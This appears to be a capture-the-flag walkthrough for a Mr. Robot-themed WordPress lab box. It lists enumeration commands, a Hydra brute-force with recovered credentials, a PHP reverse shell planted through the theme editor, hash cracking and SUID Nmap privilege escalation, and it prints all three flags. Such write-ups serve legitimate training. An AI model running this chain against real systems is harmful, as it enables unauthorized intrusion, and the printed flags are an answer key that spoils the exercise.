### What is key 1?

Start by accessing the target web server in your browser:

![alt text](image.png)

<span style="line-height:0.5;">&nbsp;</span>

Run an Nmap service scan to identify open ports and running services:
```BASH
sudo nmap -sV $ip
```
![alt text](image-1.png) 

<span style="line-height:0.5;">&nbsp;</span>

Use Gobuster to enumerate hidden directories:
```BASH
gobuster dir -u "http://$ip/" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 64
```

![alt text](image-2.png)

<span style="line-height:0.5;">&nbsp;</span>

The scan reveals a /login endpoint. Visiting it confirms the site is running WordPress:

![alt text](image-3.png)

<span style="line-height:0.5;">&nbsp;</span>

Since it’s WordPress website, enumerate users with WPScan:
```BASH
wpscan --url http://$ip/ --enumerate u
```

<span style="line-height:0.5;">&nbsp;</span>

WPScan also reveals there is a `robots.txt` file. There is also the `fsocity.dic` file with a custom wordlist, likely generated from site content or JavaScript.

Navigate to `robots.txt`:  

![alt text](image-4.png)

<span style="line-height:0.5;">&nbsp;</span>

Accessing`key-1-of-3.txt` reveals key1:

![alt text](image-5.png)

<pre>073403c8a58a1f80d943455fb30724b9</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is key 2?
![alt text](image-6.png)
The site is running WordPress 4.3.1, a version known to contain several critical vulnerabilities:
- Unauthenticated XSS  
- Privilege escalation  
- XML-RPC abuse  
- RCE via vulnerable plugins/themes
 
<span style="line-height:0.5;">&nbsp;</span>

By manually enumerating we can see that user elliot exists.  

![alt text](image-7.png)

Clean the wordlist to remove duplicates:
```BASH
sort -u fsocity.dic -o fsocity-cleaned.dic
```

<span style="line-height:0.5;">&nbsp;</span>

Use Hydra to brute-force the login credentials:
```BASH
hydra -l elliot -P fsocity-cleaned.dic -t 30 -f 10.10.247.94 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Incorrect"
```

![alt text](image-8.png)

<pre>login:elliot  
password:ER28-0652</pre>

<span style="line-height:0.5;">&nbsp;</span>

In the Appearance > Editor section, locate content.php. Replace its contents with a PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).

<span style="line-height:0.5;">&nbsp;</span>

Start netcat listener:
```BASH
nc -lvnp 4444
```

Trigger the reverse shell by visiting:`http://$ip/wp-content/themes/twentyfifteen/content.php`. Once the reverse shell connects, stabilize it:
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![alt text](image-10.png)

<span style="line-height:0.5;">&nbsp;</span>

Navigate to `home/robot` to find the second key file. However, it requires elevated privileges:

![alt text](image-11.png)

Check password.raw-md5 in the same directory:  

![alt text](image-12.png)

Crack the hash using [CrackStation](https://crackstation.net/).

![alt text](image-13.png)

<pre>abcdefghijklmnopqrstuvwxyz</pre>

<span style="line-height:0.5;">&nbsp;</span>

Switch user to robot:
```BASH
su robot
```

Now read the second key:  

![alt text](image-14.png)

Second key: 
<pre>822c73956184f694993bede3eb39f959</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is key 3?
Check for SUID binaries:
```BASH
find / -perm -4000 -type f 2>/dev/null
```

<span style="line-height:0.5;">&nbsp;</span>

Use [GTFObins](https://gtfobins.github.io/) to exploit Nmap’s interactive mode for privilege escalation:
- Run Nmap in Interactive Mode:
```BASH
/usr/local/bin/nmap --interactive
```

- At the nmap> prompt, run:
```BASH
!sh
```

Retrieve the final key:  

![alt text](image-15.png)

![alt text](image-16.png)

<pre>04787ddef27c3dee1ee161b21670b4e4</pre>
